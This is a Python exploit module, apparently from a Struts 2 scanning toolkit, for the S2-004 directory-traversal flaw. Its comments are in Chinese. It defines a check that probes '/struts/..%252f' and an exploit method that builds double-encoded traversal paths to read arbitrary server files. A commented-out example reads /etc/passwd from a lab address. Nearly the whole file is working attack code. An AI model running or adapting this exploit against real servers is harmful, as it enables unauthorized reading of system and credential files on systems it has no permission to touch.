from exploit import tools
import re

class S2_004:
    """S2-004漏洞检测利用类"""
    info = "[+] S2-004:影响版本Struts 2.0.0 - 2.0.11.2; 目录遍历漏洞，通过URL二次编码进行目录跳转获取任意文件。"
    check_poc = "/struts/..%252f"
    exec_payload = "..%252f..%252f..%252f..%252f..%252f{file_path}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if data:
            self.data = data
        else:
            self.data = "showcase.jsp"
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        self.url = self.url + self.check_poc
        html = tools.get(self.url, self.headers, self.encoding)
        if str(html).startswith("ERROR:"):
            return html
        if '.jar' in html:
            self.is_vul = True
            return 'S2-004'
        return self.is_vul

    def exec_cmd(self, cmd):
        """读取任意文件"""
        self.url = self.url + self.exec_payload.format(file_path=cmd.replace("/","%252f"))
        html = tools.get(self.url, self.headers)
        html = re.findall("<a href=\"<s:url value=\"(.*?)\"", html)
        return html

# if __name__ == '__main__':
#     url = "http://192.168.147.140:8080/struts2-showcase-2.0.5"
#     s = S2_004(url)
#     tools._proxies = {
#         "http":"http://127.0.0.1:8080",
#         "https":"http://127.0.0.1:8080"
#     }
#     print(s.info)
#     print(s.check())
#     print(s.exec_cmd("../../../../etc/passwd"))